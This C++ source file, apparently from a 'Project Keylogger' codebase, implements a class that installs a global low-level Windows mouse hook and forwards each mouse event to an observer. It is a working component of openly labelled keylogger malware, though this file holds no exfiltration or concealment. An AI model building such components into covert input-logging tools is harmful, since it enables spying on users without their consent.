/**
 *						Project Keylogger
 */


#include				"keylogger_dll/MouseHook.h"

/**
 * MouseHook implementation
 */

MouseHook* g_mouseHook = NULL;

MouseHook::MouseHook(const HookObserver& hookObserver) : AHook::AHook(hookObserver) {
	g_mouseHook = this;
}

/**
 * @return bool if hook set succeeded
 */
const bool				MouseHook::setHook() {
	if ((_hHook = SetWindowsHookEx(WH_MOUSE_LL, &mousehook, NULL, 0)) == NULL)
	{
		return false;
	}
    return true;
}

/**
 * @param int
 * @param LPARAM
 * @param WPARAM
 * @return LRESULT CALLBACK
 */
LRESULT CALLBACK		MouseHook::mousehook(int code, WPARAM wParam, LPARAM lParam) {
	g_mouseHook->notify(code, wParam, lParam);
    return CallNextHookEx(NULL, code, wParam, lParam);
}